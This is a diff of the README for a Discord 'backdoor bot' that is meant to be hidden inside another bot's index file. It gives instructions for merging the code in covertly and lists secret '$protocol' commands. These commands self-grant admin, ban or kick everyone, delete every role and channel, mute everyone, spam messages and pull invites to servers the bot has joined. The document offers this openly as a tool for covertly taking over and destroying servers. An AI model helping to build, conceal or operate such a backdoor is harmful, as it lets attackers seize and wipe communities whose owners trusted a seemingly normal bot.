@@ -4,18 +4,18 @@ A backdoor bot for discord servers
 It can be placed inside of another bots code in the index file if you want to try backdooring a normal bot.
 
 This bot is very easy to understand and you are able to customize it to be whatever you want, the protocol theme that is currently in the bot is more of a template, you can change any of it.
+
+This bot was originally based off of "PossumBot" as a template because of it's design.
 ## Backdooring
 It can be easily merged with another one of my bots because it has the same structure, to merge this with another type of bot, copy over the node modules dependencies, copy over the dependencies part in the index file, then copy line 23 to 425 and paste it in the index.
 ## Documentation
-Commands -    (Do command in chat '$protocol-002' for help) (All commands will be like this as an example '$protocol-[numbers]')
+Commands - (All commands will be like this as an example '$protocol-[numbers]')
 
-001 - In Server Help
+001 - Help Command
 
-002 - In DMs Help
+005 - Grab an invite from a server your bot was invited to ($protocol-005 [The ID of the server, you can find it in the console.])
 
-338 - Give Yourself Admin (Requires Admin Role To Be Created)
-
-338-1 - Create Admin Role
+338 - Give Yourself Admin Role
 
 624 - Start Announcement
 
@@ -23,15 +23,17 @@ Commands -    (Do command in chat '$protocol-002' for help) (All commands will b
 
 975-1 - Kick Everyone
 
+989 - Spam any message ($protocol-989 spammessage)
+
 872 - Ban a specific person
 
 872-1 - Ban Everyone
 
-471 - Mute a specific person (Requires Muted Role To Be Created)
+471 - Mute a specific person
 
-471-1 Create Muted Role 
+471-1 - Unmute a person
 
-471-3 - Unmute a person
+471-2 - Mute Everyone
 
 296 - Rename a specific person (Usage: $protocol-296 @usermention nickname)
 
@@ -39,11 +41,13 @@ Commands -    (Do command in chat '$protocol-002' for help) (All commands will b
 
 996 - Remove a rank from a specific person
 
+996-1 - Delete a role
+
+996-2 - Delete every role possible
+
 072 - Wipe chosen amount of messages
 
 114 - Make the bot say something you tell it to
-
-517 - Delete The Current Channel
 
 413 - Displays Server Info
 
@@ -54,6 +58,10 @@ Commands -    (Do command in chat '$protocol-002' for help) (All commands will b
 497-l - Lock the channel (For these commands, using at first requires it being activated twice.)
 
 497-u - Unlock the channel
+
+117 - Delete the current channel
+
+117-1 - Delete every channel
 
 672 - Bot leaves the server
 # Installation
